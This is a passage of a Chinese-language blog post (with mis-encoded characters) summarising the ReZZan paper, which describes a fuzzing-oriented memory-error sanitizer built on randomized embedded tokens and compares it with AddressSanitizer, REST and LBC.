    <content type="html"><![CDATA[<h2 id="1-å¼•è¨€"><a href="#1-å¼•è¨€" class="headerlink" title="1. å¼•è¨€"></a>1. å¼•è¨€</h2><ul><li><p>å†…å­˜é”™è¯¯æ˜¯å®‰å…¨æ¼æ´çš„å¸¸è§æ¥æº</p><ul><li>èµ‹äºˆæ”»å‡»è€…æ›´æ”¹å†…å­˜å†…å®¹çš„èƒ½åŠ›ï¼Œå¯èƒ½ä¼šæ„æˆä¿¡æ¯æ³„éœ²å’Œæ§åˆ¶æµåŠ«æŒ</li></ul></li><li><p>å†…å­˜é”™è¯¯çš„é™é»˜æ€§ï¼š</p><ul><li>å†…å­˜é”™è¯¯ä¸ä¸€å®šä¼šå¯¼è‡´ç¨‹åºç«‹å³å´©æºƒ</li><li>è¿›è¡Œæ’æ¡©ç›‘æ§å†…å­˜æƒ…å†µï¼šSanitizerï¼ˆe.g. AddressSanitizerï¼‰</li></ul></li><li><p>forkæ¨¡å¼çš„æ¨¡ç³Šæµ‹è¯• + å†…å®¹é”™è¯¯sanitizers = æ˜¾è‘—çš„æ€§èƒ½å¼€é”€</p><ul><li>AFL+AddressSanitizerï¼šååé‡é™ä½äº†çº¦58%</li><li>æ€§èƒ½ä¸‹é™çš„åŸå› ï¼š<strong>sanitizerçš„å®ç°ä¸æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¹‹é—´çš„ä¸åˆ©äº¤äº’</strong><ul><li>ä¼ ç»Ÿsanitizerä½¿ç”¨<strong>disjoint metadata</strong>æ¥è·Ÿè¸ªå†…å­˜çŠ¶æ€</li><li>ç»´æŠ¤disjoint metadataä¼šå¼•å…¥é¢å¤–çš„å¼€é”€</li></ul></li></ul></li><li><p>åŸºäºLBCå’ŒRESTç­‰å·¥å…·é¦–åˆ›çš„éšæœºåŒ–åµŒå…¥å¼ä»¤ç‰Œï¼ˆRETï¼‰çš„æ€æƒ³æ¥å¯¹å†…å­˜sanitizerè¿›è¡Œè®¾è®¡</p></li><li><p>ReZZan = REt + fuZZing + sANitizer</p><ul><li>åœ¨forkæ¨¡å¼çš„æ¨¡ç³Šæµ‹è¯•ä¸‹é€Ÿåº¦æ˜æ˜¾æ›´å¿«</li><li>1.27 Ã— åŸç”ŸAFLçš„è¿è¡Œï¼ˆAddressSanitizer 2.36 x ï¼‰</li><li>é¢å¤–æä¾›ä¸€ç§ç®€åŒ–é…ç½®ï¼Œæ— éœ€ç²¾ç¡®çš„è¾¹ç•Œæ£€æŸ¥ï¼Œå¼€é”€ä¸º1.14 x</li></ul></li></ul><h3 id="1-1-è´¡çŒ®"><a href="#1-1-è´¡çŒ®" class="headerlink" title="1.1 è´¡çŒ®"></a>1.1 è´¡çŒ®</h3><ul><li><p>æå‡ºäº†ä¸€ç§åŸºäºéšæœºåµŒå…¥ä»¤ç‰Œï¼ˆRETï¼‰æ¦‚å¿µçš„å†…å­˜é”™è¯¯sanitizerçš„è®¾è®¡</p></li><li><p>è°ƒæ•´è®¾è®¡ï¼Œæ— éœ€ä½¿ç”¨disjoint metadataï¼›æ­¤å¤–ä»‹ç»äº†åœ¨åŸºäºRETçš„è®¾è®¡ä¸‹ç”¨äºå­—èŠ‚ç²¾ç¡®å†…å­˜é”™è¯¯æ£€æµ‹çš„ç²¾ç»†è¾¹ç•Œæ£€æŸ¥çš„æ¦‚å¿µ</p></li><li><p>ä»¥ReZZanå·¥å…·çš„å½¢å¼å®ç°äº†è¯¥è®¾è®¡ï¼Œå¹¶å°†ReZZanä¸æµè¡Œçš„ç°ç›’æ¨¡ç³Šå™¨é›†æˆåœ¨ä¸€èµ·</p></li><li><p>å¯¹ASANå’ŒFuZZanè¿›è¡Œæ¯”è¾ƒï¼Œæ˜¾ç¤ºè¯¥æ–¹æ³•çš„ä¼˜è¶Šæ€§</p></li><li><p>é¡¹ç›®<strong>å¼€æº</strong>ï¼š<a href="https://github.com/bajinsheng/ReZZan">https://github.com/bajinsheng/ReZZan</a></p></li></ul><h2 id="2-èƒŒæ™¯"><a href="#2-èƒŒæ™¯" class="headerlink" title="2. èƒŒæ™¯"></a>2. èƒŒæ™¯</h2><p><strong>æ¨¡ç³Šæµ‹è¯•ï¼š</strong></p><ul><li>fork serverï¼š</li></ul><p><img src="/2023/01/10/ReZZan/1.png"></p><hr><p><strong>å†…å­˜é”™è¯¯Sanitizersï¼š</strong></p><p><img src="/2023/01/10/ReZZan/2.png"></p><ul><li><p>ä¸“ç”¨Sanitizerå’Œé€šç”¨Sanitizer</p><p>ä¸“ç”¨Sanitizerï¼š</p><ul><li>Stacké‡‘ä¸é›€ä¸“é—¨ç”¨äºå †æ ˆç¼“å†²åŒºæº¢å‡º</li><li>LowFatå’Œè½»é‡çº§è¾¹ç•Œæ£€æŸ¥ï¼ˆLBCï¼‰ä¸“é—¨ç”¨äºæº¢å‡º/ä¸‹æº¢</li><li>FreeSentryä¸“é—¨ç”¨äºUAF</li></ul><p>é€šç”¨Sanitizerï¼š</p><ul><li>AddressSanitizerï¼šå­—èŠ‚çº§ç²¾åº¦æ£€æµ‹æ‰€æœ‰ç±»å‹çš„å†…å­˜é”™è¯¯</li></ul></li><li><p>å†…å­˜é”™è¯¯æ£€æµ‹å¯èƒ½æ˜¯éƒ¨åˆ†æ£€æµ‹æˆ–ä¸ç²¾ç¡®æ£€æµ‹ï¼š</p><ul><li>GWP-ASANä»…å¯¹éšæœºé€‰æ‹©çš„å †å¯¹è±¡åº”ç”¨ä¿æŠ¤</li><li>LowFat/RESTå…è®¸å°çš„æº¢å‡ºï¼ˆä¸ä¸å…¶ä»–å¯¹è±¡ç›¸äº¤ï¼Œå³ä¸å½±å“å…¶ä»–å¯¹è±¡å˜é‡å€¼ï¼‰</li></ul></li><li><p>AddressSanitizerï¼š</p><ul><li><p>å®æ–½ä¸€ç§<strong>å†…å­˜æŠ•æ¯’</strong>ï¼ˆ<em>memory poisoning</em>ï¼‰çš„æ–¹æ³•ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šå½“ä½¿ç”¨ä¸€ä¸ªå†…å­˜é”™è¯¯èƒ½å¤Ÿè®¿é—®è¯¥å†…å­˜æ—¶ï¼Œè¯¥å†…å­˜åˆ™åˆ«æ ‡è®°ä¸ºâ€œä¸­æ¯’â€ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>å¯¹æ¯ä¸ªæœ‰æ•ˆåˆ†é…å¯¹è±¡ä¹‹é—´æ’å…¥çš„å°çš„<strong>REDZONE</strong>åŒºåŸŸè¿›è¡Œæ ‡è®°ï¼Œè¯¥åŒºåŸŸç”¨äºæ£€æµ‹å¯¹è±¡è¾¹ç•Œæº¢å‡º/ä¸‹æº¢é”™è¯¯</li><li>å¯¹<code>free()</code>çš„å†…å­˜è¿›è¡Œæ ‡è®°æ¥æ£€æµ‹UAFé”™è¯¯</li></ul></li><li><p>ä½¿ç”¨è¿è¡Œæ—¶æ”¯æŒåº“æ¥<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åœ¨å·²åˆ†é…å¯¹è±¡ä¹‹é—´æ’å…¥redzoneå¹¶å¯¹å…¶æ ‡è®°ï¼›<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¯¹<code>free()</code>çš„å†…å­˜è¿›è¡Œæ ‡è®°</p></li><li><p>å¯¹æ‰€æœ‰å†…å­˜è®¿é—®æ“ä½œè¿›è¡Œæ’æ¡©ï¼Œä»¥æ£€æµ‹å†…å­˜æ˜¯å¦ä¸­æ¯’ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( poisoned ( p )) <span class="hljs-comment">// Instrumentation</span><br>error ();<br>* p = v ; <span class="hljs-comment">/* or */</span> v = * p ; <span class="hljs-comment">// Access </span><br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p><strong>AddressSanitizerçš„å†…å­˜æŠ•æ¯’</strong>ï¼š</p><ul><li><p>å°†ç¨‹åºçš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†æ¥å®ç°å†…å­˜æŠ•æ¯’ï¼šåº”ç”¨ç¨‹åºå†…å­˜(application memory) å’Œ å½±å­å†…å­˜(shadow memory)</p></li><li><p>å½±å­å†…å­˜ç”¨ä»¥è·Ÿè¸ªåº”ç”¨ç¨‹åºå†…å­˜ä¸­æ¯ä¸ªå­—èŠ‚çš„ä¸­æ¯’æƒ…å†µã€‚å› æ­¤ï¼Œåº”ç”¨ç¨‹åºå†…å­˜æ¯8ä¸ªå­—èŠ‚éƒ½å°†æ˜ å°„åˆ°ç›¸åº”çš„å½±å­å­—èŠ‚ï¼Œi.e. $addr_{shadow}=offset_{shadow}+(addr/8)$ï¼Œè¿™é‡Œçš„å½±å­å†…å­˜å…¶å®å°±æ˜¯<strong>disjoint metadata</strong>çš„ä¸€ç§è¡¨ç°</p></li><li><p><strong>disjoint metadata</strong>ï¼ˆi.e. ä¸€ç§é¢å¤–çš„metadataï¼‰ï¼š<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ç”±Sanitizerç»´æŠ¤ï¼›<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¸åº”ç”¨ç¨‹åºå†…å­˜/æ•°æ®åˆ†ç¦»</p><ul><li>ä¼šå¸¦æ¥é¢å¤–çš„å†…å­˜å¼€é”€</li><li>å½±å“äº†å†…å­˜ä½ç½®ï¼ˆi.e. åº”ç”¨ç¨‹åºå’Œå½±å­å†…å­˜æ˜¯åˆ†ç¦»çš„ï¼‰</li></ul></li></ul></li><li><p>å†…å­˜æŠ•æ¯’çš„æ›¿ä»£å®ç°â€”â€”<strong>RETï¼ˆéšæœºåŒ–åµŒå…¥ä»¤ç‰Œï¼‰</strong>ï¼š</p><ul><li><p>poisonedå†…å­˜ç”±ä¸€ä¸ªç‰¹æ®Šçš„<strong>ä»¤ç‰Œ</strong>è¡¨ç¤ºï¼Œè¯¥ä»¤ç‰Œåˆå§‹åŒ–ä¸ºæŸä¸ªé¢„å®šçš„éšæœºæ•°å€¼ï¼Œå¦‚æœå†…å­˜ç›´æ¥å­˜å‚¨è¯¥éšæœºå€¼ï¼Œåˆ™è®¤ä¸ºå†…å­˜â€œä¸­æ¯’â€äº†</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">poisoned(p)=(*(p-p%<span class="hljs-keyword">sizeof</span>(Token))==NONCE)<br></code></pre></td></tr></tbody></table></figure></li><li><p>å¦‚æœNONCEå€¼ä¸ç¨‹åºæ­£å¸¸æ‰§è¡ŒæœŸé—´åˆ›å»ºçš„åˆæ³•å€¼å†²çªï¼Œåˆ™å¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯çš„æ£€æµ‹</p></li><li><p><strong>REST</strong>ä½¿ç”¨ä¸€ä¸ªéå¸¸å¤§çš„ä»¤ç‰Œå¤§å°ï¼ˆæ•´ä¸ª512ä½ç¼“å­˜çº¿ï¼‰å’Œä¸€ä¸ªå¼ºå¤§çš„ä¼ªéšæœºæº</p><ul><li><p>å¤§å‹ï¼ˆå¤šå­—èŠ‚ï¼‰ä»¤ç‰Œä¼šå¯¼è‡´å†…å­˜é”™è¯¯æ£€æµ‹ç²’åº¦é™ä½ï¼ˆç²—ç²’åº¦ï¼‰</p></li><li><p>e.g. ç»™å®šREST 512ä½ï¼ˆ64å­—èŠ‚ï¼‰ä»¤ç‰Œï¼Œå¯¹malloc(27)çš„è°ƒç”¨å°†ï¼š</p><p>(1) å°†åˆ†é…å¤§å°å¢åŠ  64 - 27 = 37 å­—èŠ‚</p><p>(2) åˆ†é…å·²å¯¹é½äº†ä¸€ä¸ª64å­—èŠ‚çš„å¯¹è±¡</p><p>(3) åœ¨64..127å­—èŠ‚å¤„å­˜å‚¨ä¸€ä¸ªtokenå€¼æ¥å®ç°redzone</p><p>i.e. 27..63å­—èŠ‚çš„æº¢å‡ºéƒ½ä¸ä¼šè®¿é—®ä»¤ç‰Œï¼Œå³ä¸ä¼šåˆ¤æ–­ä¸ºå†…å­˜é”™è¯¯ï¼Œå› æ­¤<strong>RESTä¸æ˜¯å­—èŠ‚ç²¾ç¡®çš„</strong></p></li></ul></li><li><p>RETæ€æƒ³æœ€æ—©è¢«<strong>LBC</strong>æ‰€ä½¿ç”¨ï¼Œä¸åƒRESTï¼ŒLBCä½¿ç”¨å•å­—èŠ‚ï¼ˆ8ä½ï¼‰ä»¤ç‰Œå¤§å°ï¼Œå…è®¸è¿›è¡Œå­—èŠ‚ç²¾ç¡®çš„å†…å­˜é”™è¯¯æ£€æµ‹ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€ç¢°æ’ä¸å¯é¿å…ï¼›ä¸ºäº†é¿å…ç¢°æ’ï¼ŒLBCå®ç°äº†ä¸€ç§æ··åˆæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¿ç•™äº†<strong>disjoint metadata</strong>ï¼Œä»¥åŒºåˆ†å†²çªå’Œåˆæ³•çš„å†…å­˜é”™è¯¯</p></li></ul></li></ul><hr><p><strong>é—®é¢˜æè¿°ï¼š</strong></p><ul><li><p>ç°è±¡ï¼šæ¨¡ç³Šæµ‹è¯•å’ŒSanitizeråº”è¯¥ååŒå·¥ä½œï¼Œä½†åœ¨å®è·µä¸­ï¼Œæ¨¡ç³Šæµ‹è¯•å’ŒSanitizerçš„ç»„åˆæ€§èƒ½è¾ƒå·®</p></li><li><p>æ ¹æœ¬åŸå› ï¼šfork()ç³»ç»Ÿè°ƒç”¨çš„å†™æ—¶å¤åˆ¶ï¼ˆ<em>copy-on-write</em> COWï¼‰è¯­ä¹‰ä¸Sanitizerå¯¹äºä»»ä½•<strong>disjoint metadata</strong>çš„åˆå§‹åŒ–/ä½¿ç”¨ä¹‹é—´çš„äº¤äº’</p><ul><li>å­è¿›ç¨‹å› å‘ç”Ÿé¡µé¢é”™è¯¯è€Œæ‹·è´é¡µ</li><li>fuzzing + sanitizerä¼šå¯¼è‡´é¡µé¢é”™è¯¯çš„æ¿€å¢ï¼šä¸€ä¸ªç”¨äºå·²åˆ†é…çš„å¯¹è±¡ï¼Œå¦ä¸€ä¸ªç”¨äº<strong>disjoint metadata</strong></li></ul></li><li><p>AddressSanitizerè¿˜å¼•å…¥äº†ä¸fork()ç›¸å…³çš„å…¶ä»–å¼€é”€ï¼Œe.g.å¤åˆ¶å†…æ ¸æ•°æ®ç»“æ„ï¼ˆåŒ…æ‹¬è™šæ‹Ÿå†…å­˜VMAã€é¡µè¡¨å’Œç›¸å…³æ‹†å¸å¼€é”€ï¼‰</p></li></ul><hr><p><strong>è§£å†³åŠæ³•</strong>ï¼š</p><ul><li>ä¸€ä¸ªæƒ³æ³•æ˜¯é€‰æ‹©ä¸€ä¸ªå…·æœ‰ä½å†…å­˜å¼€é”€å’Œé«˜å±€éƒ¨æ€§çš„å†…å­˜é”™è¯¯Sanitizer</li><li>å¦ä¸€ä¸ªæƒ³æ³•æ˜¯ä¼˜åŒ–<strong>disjoint metadata</strong>çš„è¡¨ç¤º</li></ul><h3 id="2-1-æˆ‘ä»¬çš„è®¾è®¡"><a href="#2-1-æˆ‘ä»¬çš„è®¾è®¡" class="headerlink" title="2.1 æˆ‘ä»¬çš„è®¾è®¡"></a>2.1 æˆ‘ä»¬çš„è®¾è®¡</h3><ul><li><p>æå‡ºä¸€ç§åŸºäºéšæœºåŒ–åµŒå…¥ä»¤ç‰Œï¼ˆRETï¼‰çš„å˜ä½“ï¼Œè¯¥å˜ä½“ä¸ä½¿ç”¨å½±å­å†…å­˜æˆ–å…¶ä»–disjoint metadataè¡¨ç¤º</p></li><li><p>å…³é”®æ€æƒ³æ˜¯é€šè¿‡ä½¿ç”¨å†…å­˜æœ¬èº«è·Ÿè¸ªä¸­æ¯’çŠ¶æ€</p><ul><li>é¿å…ä»»ä½•çš„å…¶ä»–é¡µé”™è¯¯ï¼ˆç”±disjoint metadataçš„åˆå§‹åŒ–æˆ–è®¿é—®å¯¼è‡´çš„ï¼‰</li><li>æ’æ¡©æ£€æŸ¥å’Œç›¸åº”çš„å†…å­˜æ“ä½œä¸ä¼šå¸¦æ¥é¢å¤–çš„é¡µé”™è¯¯</li></ul></li><li><p>è®¾è®¡çš„ä¸»è¦å…ƒç´ æ€»ç»“å¦‚ä¸‹ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>ä»¤ç‰Œå¤§å°</strong></p><ul><li>æŸäº›ç°æœ‰çš„å·¥å…·åŸºäºRETè®¾è®¡ï¼Œå¦‚RESRï¼ˆä»¤ç‰Œå¤§å°512ä½ï¼‰å’ŒLBCï¼ˆä»¤ç‰Œå¤§å°8ä½ï¼‰</li><li>è§è§£ï¼šå¯¹äºæ¨¡ç³Šæµ‹è¯•åº”ç”¨ï¼Œå¯ä»¥å®¹å¿ä¸€äº›å°çº§åˆ«çš„é”™è¯¯æ£€æµ‹<ul><li>medium ä»¤ç‰Œå¤§å°ï¼š64ä½</li><li>ä½¿ç”¨ä¸åŒçš„éšæœºåŒ–NONCEå€¼é‡æ–°æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹å¯ä»¥åœ¨ä¸€å®šç¨‹åºä¸Šå‡è½»é”™è¯¯æ£€æµ‹çš„å¼€é”€</li></ul></li></ul><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>å†…å­˜é”™è¯¯æ£€æµ‹ç²’åº¦</strong></p><ul><li>åœ¨åŸºæœ¬çš„RETè®¾è®¡ä¸‹ï¼Œtokenséœ€è¦å­˜å‚¨åœ¨tokenå¤§å°å¯¹é½çš„è¾¹ç•Œä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´64ä½tokenséœ€è¦è¿›è¡Œ8å­—èŠ‚å¯¹é½</li><li>å¯¹RETè¿›è¡Œæ”¹è¿›ï¼šå¯¹è±¡è¾¹ç•Œä¿¡æ¯ç›´æ¥<strong>ç¼–ç </strong>åˆ°ä»¤ç‰Œè¡¨ç¤ºæœ¬èº«ä¸­</li></ul><p><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>ç¡¬ä»¶</strong></p><ul><li>RESTï¼šæ— æ ‡å‡†ç¡¬ä»¶æ‰©å±•ï¼›LBCï¼š32ä½x86ç³»ç»Ÿ</li><li>æœ¬æ–‡æå‡ºçš„åŸºäºRETçš„è®¾è®¡ï¼šé’ˆå¯¹æ ‡å‡†ç¡¬ä»¶ï¼ˆx86_64ï¼‰å’Œæ ‡å‡†æ¨¡ç³Šå™¨è®¾è®¡</li></ul></li></ul><h2 id="3-åŸºæœ¬å†…å­˜é”™è¯¯æ£€æµ‹"><a href="#3-åŸºæœ¬å†…å­˜é”™è¯¯æ£€æµ‹" class="headerlink" title="3. åŸºæœ¬å†…å­˜é”™è¯¯æ£€æµ‹"></a>3. åŸºæœ¬å†…å­˜é”™è¯¯æ£€æµ‹</h2><ul><li>ä½¿ç”¨ä»¥ä¸‹ç»“æ„ç±»å‹æ¥å®šä¹‰RETï¼š</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Token</span> {</span> <span class="hljs-type">uint64_t</span> random; };<br></code></pre></td></tr></tbody></table></figure><hr><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>æ’æ¡©æ¨¡å¼ï¼š</strong></p><ul><li>åŸºæœ¬æ–¹æ³•ï¼šè½¬æ¢ç¨‹åºï¼ˆe.g.ä½¿ç”¨ä¸€ä¸ªLLVMç¼–è¯‘å™¨åŸºç¡€è®¾æ–½<strong>pass</strong>ï¼‰æ¥åœ¨æ¯ä¸ªå†…å­˜è®¿é—®ä¹‹å‰æ’å…¥æ’æ¡©ä»£ç </li><li>æ’æ¡©å†…å®¹ï¼šæ£€æŸ¥æ˜¯å¦è¿åç»™å®šçš„å®‰å…¨å±æ€§ï¼ˆåœ¨è®¾è®¡çš„sanitizerä¸­ï¼Œè¯¥å®‰å…¨å±æ€§æ˜¯ç›¸åº”è®¿é—®çš„å†…å®¹æ˜¯å¦è¢«poisonedï¼‰</li></ul><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>:</p><p><img src="/2023/01/10/ReZZan/3.png"></p><ul><li><img src="/2023/01/10/ReZZan/4.png"></li></ul><blockquote><p>ç¬¬4è¡Œå†…å­˜é—´æ¥å¼•ç”¨ä¸ä¼šäº§ç”Ÿä»»ä½•å…¶ä»–é¡µé”™è¯¯ï¼Œè€Œç¬¬5-6è¡Œçš„é”™è¯¯æ£€æŸ¥è®¿é—®å†…å­˜ä»¥æ£€ç´¢å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­çš„NONCEå€¼ï¼Œè€ŒNONCEå­˜å‚¨åœ¨å•ä¸ªä½ç½®ï¼Œå› æ­¤è¿™é‡Œ<strong>æœ€å¤šä¼šé¢å¤–äº§ç”Ÿä¸€ä¸ªé¡µé”™è¯¯</strong></p></blockquote><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>è¿è¡Œæ—¶æ”¯æŒï¼š</strong></p><ul><li><p>åŠ å¼ºå†…å­˜å®‰å…¨ï¼Œä¿®æ”¹äº†è¿è¡Œæ—¶ç¯å¢ƒä»¥æ¯’åŒ–redzoneå’Œfreeå†…å­˜</p></li><li><p>æ¯ä¸€ä¸ªå¯¹è±¡ç±»å¤„ç†æ–¹å¼ä¸åŒï¼š</p><p><strong>å †åˆ†é…å¯¹è±¡</strong>ï¼še.g. <code>malloc</code>, <code>realloc</code>, <code>new</code>ç­‰éƒ½è¢«æ›¿æ¢æˆä¸ºæ¯ä¸€ä¸ªåˆ†é…ç›®æ ‡åæ·»åŠ äº†redzoneçš„ç‰ˆæœ¬ï¼Œredzonesçš„å®ç°ä¸å…¶ä»–å†…å­˜é”™è¯¯sanitizerç›¸ä¼¼ï¼Œä½†ä¹Ÿæœ‰ä¸åŒï¼š</p><ol><li>Poisoningæ˜¯é€šè¿‡å°†NONCE-åˆå§‹åŒ–ä»¤ç‰Œç›´æ¥å†™å…¥redzoneå†…å­˜æ¥å®ç°çš„</li><li>redzoneçš„å¤§å°æ˜¯1ä¸ªæˆ–è€…2ä¸ªtokensï¼ˆå–å†³äºå¯¹é½ï¼‰</li><li>redzoneæ”¾ç½®åœ¨ç›®æ ‡çš„æœ€åï¼Œé€šè¿‡å‰ä¸€ä¸ªå¯¹è±¡çš„redzoneæ¥æ£€æµ‹Underflows</li></ol><p>å®ç°äº†ä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰å†…å­˜åˆ†é…å™¨ï¼šè¿ç»­åˆ†é…ç›®æ ‡</p><p>å †å†…å­˜é‡Šæ”¾ï¼šé‡Šæ”¾çš„ç›®æ ‡ç›¸åº”å†…å­˜å¡«å……ä¸ºä¸€ä¸ªNONCE-åˆå§‹åŒ–çš„tokenï¼›ç»´æŠ¤äº†ä¸€ä¸ªéš”ç¦»åŒºï¼ˆæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé˜Ÿåˆ—ï¼‰ï¼Œéš”ç¦»åŒºå­˜æ”¾äº†é‡Šæ”¾çš„å†…å­˜ç›®æ ‡ï¼Œç›®çš„æ˜¯å»¶è¿Ÿé‡æ–°åˆ†é…ï¼Œä»è€Œæ›´å¯èƒ½æ£€æµ‹åˆ°<code>reuse-after-free</code>ã€‚ä»éš”ç¦»åŒºåˆ é™¤å¯¹è±¡ä»¥ä¾¿é‡æ–°åˆ†é…ï¼Œç›¸åº”çš„å†…å­˜åœ¨ä½¿ç”¨å‰æ¸…é›¶ä»¥â€œunpoisonâ€è¯¥å†…å­˜ã€‚</p><hr><p><strong>æ ˆåˆ†é…å¯¹è±¡</strong>ï¼šä½¿ç”¨LLVM passå®ç°è½¬æ¢</p><ol><li>ä¿®æ”¹åˆ†é…å¤§å°ï¼šåŒ…å«åŸå§‹åˆ†é…çš„å¤§å°å’Œä¸€ä¸ªredzoneå†…å­˜</li><li>redzoneå†…å­˜å°†å†™å…¥ä¸€ä¸ªNONCE-åˆå§‹åŒ–tokenï¼Œå‰©ä½™å†…å­˜å…¨éƒ¨ç½®0</li></ol><hr><p><strong>å…¨å±€å˜é‡</strong>ï¼š ä½¿ç”¨LLVM passå®ç°è½¬æ¢</p><p>å…·ä½“æ“ä½œå’Œæ ˆåˆ†é…å¯¹è±¡ç›¸ä¼¼ï¼Œä¸å†èµ˜è¿°</p></li></ul><h2 id="4-æ”¹è¿›çš„è¾¹ç•Œæ£€æŸ¥"><a href="#4-æ”¹è¿›çš„è¾¹ç•Œæ£€æŸ¥" class="headerlink" title="4. æ”¹è¿›çš„è¾¹ç•Œæ£€æŸ¥"></a>4. æ”¹è¿›çš„è¾¹ç•Œæ£€æŸ¥</h2><ul><li><p>åŸºæœ¬æ€æƒ³ï¼šé™¤äº†éšæœºåŒ–çš„NONCEä¹‹å¤–ï¼Œè¿˜å°†å¯¹è±¡è¾¹ç•Œä¿¡æ¯<strong>ç¼–ç </strong>å­˜è¿›åµŒå…¥ä»¤ç‰Œä¸­ï¼Œè¯¥è¾¹ç•Œä¿¡æ¯å¯ä»¥åœ¨è¿è¡Œæ—¶æ£€ç´¢</p></li><li><p>åŒ…å«ä¸¤ä¸ªç»„ä»¶ï¼š</p><ul><li><em>random</em>ï¼šNONCEå€¼</li><li>boundaryï¼šç›®æ ‡è¾¹ç•Œçš„ç¼–ç å½¢å¼ï¼š</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">size mod <span class="hljs-title function_">sizeof</span><span class="hljs-params">(Token)</span>  <span class="hljs-comment">// sizeæ˜¯ç›®æ ‡çš„å¤§å°</span><br></code></pre></td></tr></tbody></table></figure></li><li><p>æ”¹è¿›çš„ä»¤ç‰Œæ˜¯ç”±å…·æœ‰ä¸¤ä¸ªä½å­—æ®µçš„ç»“æ„è¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Token</span> {</span><br><span class="hljs-type">uint64_t</span> random :<span class="hljs-number">61</span>; <span class="hljs-comment">// NONCE</span><br><span class="hljs-type">uint64_t</span> boundary :<span class="hljs-number">3</span>; <span class="hljs-comment">// Boundary encoding</span><br>};<br></code></pre></td></tr></tbody></table></figure><p><em>boundary</em>å­—æ®µè‡³å°‘éœ€è¦<strong>3ä½</strong>æ¥è¡¨ç¤ºæ‰€æœ‰å¯èƒ½çš„è¾¹ç•Œå€¼ï¼Œé‚£ä¹ˆ<em>random</em>å­—æ®µå°±åªèƒ½ç¼©å‡ä¸º<strong>61ä½</strong>ï¼ˆ64-3ï¼‰</p></li></ul><hr><ul><li>ä½¿ç”¨é¢å¤–çš„è¾¹ç•Œæ£€æŸ¥å¯¹å†…å­˜è®¿é—®è¿›è¡Œæ’æ¡©ï¼ŒåŸºæœ¬æ€æƒ³å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="/2023/01/10/ReZZan/5.png"></p><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å‡è®¾ç›®æ ‡å¤§å°ä¸æ˜¯ä¸€ä¸ªä»¤ç‰Œå¤§å°ï¼ˆ8å­—èŠ‚ï¼‰çš„æ•´æ•°å€ï¼Œe.g. (<em>size</em> mod sizeof(Token)) = 5ï¼Œä¹Ÿå°±æ˜¯è¦ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„sizeof(Token)-5=3å­—èŠ‚çš„<strong>å¡«å……</strong>ï¼Œåœ¨è¯¥å¡«å……ä¸­çš„æº¢å‡ºæ— 